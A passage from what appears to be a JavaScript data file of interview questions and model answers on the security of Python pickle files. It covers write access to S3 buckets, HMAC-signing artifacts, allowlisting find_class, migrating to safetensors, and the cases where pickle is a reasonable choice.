          { t: "p", text: "If you want to show operational judgement, add the trust-boundary framing. The question is never where the file came from, it is who could have written it — and for a shared artifact bucket that includes every CI job, every engineer, and every leaked key. That turns storage into an unreviewed deployment channel." }
        ]
      },
      {
        level: "core",
        q: "Your team stores ML models as pickles in S3. Is that acceptable?",
        strong: "It depends entirely on who can write to that bucket. If writes are restricted to a CI role and artifacts are HMAC-signed and verified before loading, it is defensible. If two data scientists and a nightly job can also write, then a bucket write is a code-execution primitive in the model server, and I would sign the artifacts immediately and migrate the weights to `safetensors`.",
        answer: [
          { t: "p", text: "Answering with a flat \"no, never\" is weaker than it sounds — plenty of production systems ship pickles safely, and an interviewer wants to hear you reason about the boundary rather than recite a rule." },
          { t: "p", text: "The structure that lands is layered, with each layer's job stated. Restrict who can write. Sign the bytes and verify with `hmac.compare_digest` before any unpickling. Allowlist `find_class` as a second line for the case where the key leaks. Then change the format so the primitive disappears — because the first three reduce blast radius and only the last removes it." },
          { t: "p", text: "Two details that mark experience: `joblib.load` is `pickle.load` underneath, so nothing changes by using it; and image scanning, dependency pinning and code review all miss this class of attack entirely, because the payload arrives as data rather than as code. That is why it survives in organisations that are otherwise careful." }
        ],
        weak: "Answering \"it's fine, it's an internal bucket\". Internal describes the network, not the write ACL, and every real incident of this shape began with a credential that was legitimately internal."
      },
      {
        level: "advanced",
        q: "When would you deliberately choose pickle?",
        strong: "When the bytes never cross a trust boundary and I need something no other format gives me: `multiprocessing` argument passing, an object graph with cycles or shared references, or a short-lived local cache written and read by the same process. Anything crossing a boundary gets a format that is parsed rather than executed.",
        answer: [
          { t: "p", text: "This question checks whether you have a rule or a superstition. Someone who only knows \"pickle is dangerous\" cannot answer it, and every Python process running a process pool is already using pickle whether the candidate realises it or not." },
          { t: "p", text: "The `multiprocessing` example is the strongest because it explains a symptom the interviewer has certainly seen: `Can't pickle local object` when a lambda is submitted to a worker pool. That error is the pickler saying it can only record an importable name, which also explains why the fix is a module-level function rather than a serialisation setting." },
          { t: "p", text: "Add the second reason pickle is a bad archive even where it is safe: the stream records your class's import path, so moving a class into a subpackage breaks every stored artifact. That is the argument that persuades teams who correctly point out their bucket is locked down — security is not the only reason to leave, and durability is the one that eventually bites them anyway." }
        ]
      }
    ]
  }
});
